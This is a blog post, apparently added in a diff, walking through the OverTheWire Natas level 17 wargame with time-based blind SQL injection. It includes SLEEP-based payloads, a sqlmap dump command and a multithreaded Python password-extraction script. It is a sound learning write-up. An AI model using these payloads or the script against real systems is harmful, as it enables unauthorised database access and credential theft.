@@ -1,0 +1,222 @@
+---
+layout: post
+title:  "Natas Level 16 → Level 17"
+date:   2021-05-29 02:01:38
+categories: ctf wargames web-security
+tags: wargames ctf overthewire web-security
+series: "OverTheWire: Natas"
+excerpt: I've got too much time on my hands
+mathjax: false
+---
+
+## Level Goal
+Excluding the URL and username, the Level Goal section is blank for the Natas ctf.
+
+
+## Solution
+The natas17 site is a slightly altered version of the natas 15 site. While the search still works the same, the portion of the code that was responsible that reported whether or not the user exists is now commented out. This means the natas15 solution will no longer work. 
+
+The site now uses POST instead of GET for submitting form data.  Debug is still available and still uses GET.
+
+Source:
+```php
+<?
+/*
+CREATE TABLE `users` (
+  `username` varchar(64) DEFAULT NULL,
+  `password` varchar(64) DEFAULT NULL
+);
+*/
+
+if(array_key_exists("username", $_REQUEST)) {
+    $link = mysql_connect('localhost', 'natas17', '<censored>');
+    mysql_select_db('natas17', $link);
+    
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+    if(array_key_exists("debug", $_GET)) {
+        echo "Executing query: $query<br>";
+    }
+
+    $res = mysql_query($query, $link);
+    if($res) {
+    if(mysql_num_rows($res) > 0) {
+        //echo "This user exists.<br>";
+    } else {
+        //echo "This user doesn't exist.<br>";
+    }
+    } else {
+        //echo "Error in query.<br>";
+    }
+
+    mysql_close($link);
+} else {
+?>
+<form action="index.php" method="POST"> 
+```
+
+It would seem at first glance there's little we can do here. We can still perform the query, but have no way to get any output. The weakness here is that the inputs are still not sanatized. This means we can add to the SQL query and create a different attack method that also makes use of the Blind attacks from the previous levels. 
+
+In the previous levels were able to check whether a statement was true or false based upon the output we got back from the server. Since we're unable to get any text, we'll need to come up with something different. We'll need to use the SLEEP command, which works as you'd expect, and some boolean logic.
+
+In a previous level we combined two conditions with an OR. We altered the statement to say if we entered both the correct username and password, or if 1=1, give us access. Since OR only requires one side of the statement to be true, we gained access. 
+
+This time we'll use AND which requires both sides of the statement to be true. On the left side of the AND we'll ask the server if the username is valid and the password contains a specific character. On the right side we'll add the SLEEP command.  The left side of the statement will appear to us to function the same whether we enter a correct character or not. The SLEEP command will allow us to determine if there was a match. If the given character doesn't match, the right side of the AND is not evaluated. If the character matches, the response from the page will be measurably slower. By monitoring for slow responses, we can determine if we have a match or not.  This is known as Timing attack.
+
+Since the user input is submitted using POST instead of GET, we won't be able to craft a URL for testing. While I'm sure there are addons to simplify sending form data with POST, I'm going to stick with Firefox's built-in Developer Tools.
+
+First, open the developer tools and click on the Network tab. Once that is done, enter anything into the form and click the button. In the network section, you'll see all the javascript load, index.php, and the attempt at loading the favicon. The only part we're concerned with is index.php.
+
+<img src="/assets/img/natas/natas17_network_tab.png" alt="Dev Tools Network Tab" height="239" width="652" />
+
+Right click on the index.php line and choose Edit and Resend. A panel will appear to the right that will allow you to enter in POST data and resend it. You may need to scroll or resize the developer tools to see Request Body section. In the screenshot below, you'll see that I entered natas18 into the form before I clicked the button. The word(s) you entered don't matter. We're going to delete everything in this section.
+
+<img src="/assets/img/natas/natas17_edit_resend.png" alt="Edit and Resend Panel" height="357" width="516" />
+
+Delete all the text in the Request Body section and enter the following:
+```
+username=natas18" AND password LIKE BINARY "%a%" and SLEEP(5) #
+```
+
+If you'd like to use debug, you can append **?debug** to the URL at the top of the panel. Do not include it in the Request Body. I won't be using debug, but you're welcome to. Note that if you do, you won't see the results in the browser window. I'll cover where the output is in the next section.
+
+Click the blue Send button at the top of the panel.  The panel will close and the results of your search will appear at the bottom of the file list, and be highlighted once the query is complete. 
+
+Single click on highlighted index.php entry and select Timings. If you're using debug, you can click on Response to see a rendered version of the webpage. Since debug simply returns the query entered, you can't use it for an attack.
+
+<img src="/assets/img/natas/natas17_timings_a.png" alt="Network Timings for Character a" height="207" width="553" />
+
+If you look at the Waiting entry on the Timings graph you'll see we got our response in 124ms. Since our attack contains a 5 second sleep, we know the password does not contain an 'a'.
+
+Let's search for a character that's in the password. Right click on index.php and enter the following into the Request Body:
+```
+username=natas18" AND password LIKE BINARY "%x%" and SLEEP(5) #
+```
+
+Click on the blue Send button. Notice that the panel didn't disappear as quickly as it did last time. Once it does disappear, look at the highlighted index.php in the file list. Notice there's now a turtle to the right. This is a quick visual indicator that the file was slow to load.
+
+<img src="/assets/img/natas/natas17_turtle.png" alt="Dev Tools Network Tab Showing Turtle Icon" height="328" width="652" />
+
+Single click on the highlighted index.php and then click on Timings in panel on the right.
+
+<img src="/assets/img/natas/natas17_timings_x.png" alt="Network Timings for Character x" height="208" width="504" />
+
+Here you can see that the Waiting portion of the graph is now 5.12s. This tells us that the password contains an 'x'.
+
+As with natas15, we can solve this with sqlmap and with a Python script. I'll show both below. Unlike natas15, I'll only include a multithreaded script for this level.
+
+### sqlmap
+Running sqlmap took 12 minutes on my system, even though sqlmap set the sleep timer to 1 second. This is due to sqlmap leaking all users and passwords. The database contains 4 accounts, with each account having a 32 character password. You'll need to supply the current level password in order to run the following:
+
+```bash
+sqlmap -u "http://natas17.natas.labs.overthewire.org/index.php" --auth-type=Basic --auth-cred=natas17:8------------------------------w --data="username=natas18" --level=3 --risk=1 --technique=T --threads=4 --dbms=MySQL -D natas17 -T users -C username,password --dump --batch
+```
+
+Here's a breakdown on each option:
+```
+-u              URL
+--auth-type     HTTP authentication
+--auth-cred     HTTP authentication credentials (name:password)
+--data          Data string to be sent
+--level         Number of checks to be performed. 
+                Range is 1 to 5. Default is 1.
+--risk          Types of payloads to use. Higher numbers could cause problems for the server. 
+                Range is 1 to 3.  Default is 1.
+--technique     T is for Time-based attacks
+--threads       Max number of concurrent HTTP(s) requests
+--dbms          DataBase Management System 
+-D              Database name        
+-T              Table name
+-C              Column name(s)
+--dump          Dump DBMS database table entries
+--batch         Never ask for user input, use the default behaviour
+```
+
+### Python
+Unlike sqlmap, this script will not determine if the sleep time is too short. In my limited testing, I've received a response to my queries in 0.125 seconds. I'm going to use 1 second as my sleep timer. Depending on your internet connection, you may need to increase the sleep time. You'll need to supply the current level password in order to run the script.
+
+Script Performance:
+```
+Filtering characters completed in 5.85 seconds
+Password search completed in 49.35 seconds
+
+Completed in 55.2 seconds
+```
+
+Here's the script.
+```python
+#!/usr/bin/env python
+import time
+import string
+import requests
+from requests.auth import HTTPBasicAuth
+import concurrent.futures
+
+
+start_script = time.perf_counter()
+all_chars = list(string.ascii_uppercase + string.ascii_lowercase + string.digits)
+natas17_password = "8------------------------------w"  # Password for the current level
+natas18_password = ""  # Buffer for the next level password
+filtered_chars = ""
+sleep_time = 1  # how many seconds of sleep to use in timing attack
+
+
+def get_chars(char):
+    data = {'username': 'natas18" and password LIKE BINARY "%' + char + '%" and sleep(' + str(sleep_time) + ') #'}
+
+    attack_start = time.perf_counter()
+    req = requests.post('http://natas17.natas.labs.overthewire.org/index.php?debug',
+                        auth=HTTPBasicAuth('natas17', natas17_password), data=data)
+    attack_end = time.perf_counter()
+    attack_time = round(attack_end - attack_start, 2)
+
+    if attack_time > 1:
+        return char
+    else:
+        return None
+
+
+start_filter = time.perf_counter()
+with concurrent.futures.ThreadPoolExecutor() as executor:
+    result = executor.map(get_chars, all_chars)
+
+    for r in result:
+        if r is not None:
+            print(r, end='', flush=True)
+            filtered_chars = filtered_chars + str(r)
+
+end_filter = time.perf_counter()
+print(f'\nFiltering characters completed in {round(end_filter - start_filter, 2)} seconds')
+
+
+def get_password(fc):
+    data = {'username': 'natas18" and password LIKE BINARY "' + natas18_password + str(fc) +
+                        '%" and sleep(' + str(sleep_time) + ') #'}
+
+    attack_start = time.perf_counter()
+    req = requests.post('http://natas17.natas.labs.overthewire.org/index.php?debug',
+                        auth=HTTPBasicAuth('natas17', natas17_password), data=data)
+    attack_end = time.perf_counter()
+    attack_time = round(attack_end - attack_start, 2)
+
+    if attack_time > 1:
+        return str(fc)
+    else:
+        return None
+
+
+start_password = time.perf_counter()
+for _ in range(0, 32):
+    with concurrent.futures.ThreadPoolExecutor() as executor:
+        result = executor.map(get_password, filtered_chars)
+
+        for r in result:
+            if r is not None:
+                natas18_password = natas18_password + str(r)
+                print(r, end='', flush=True)
+
+end_password = time.perf_counter()
+print(f'\nPassword search completed in {round(end_password - start_password, 2)} seconds')
+
+end_script = time.perf_counter()
+print(f'\nCompleted in {round(end_script - start_script, 2)} seconds')
+```
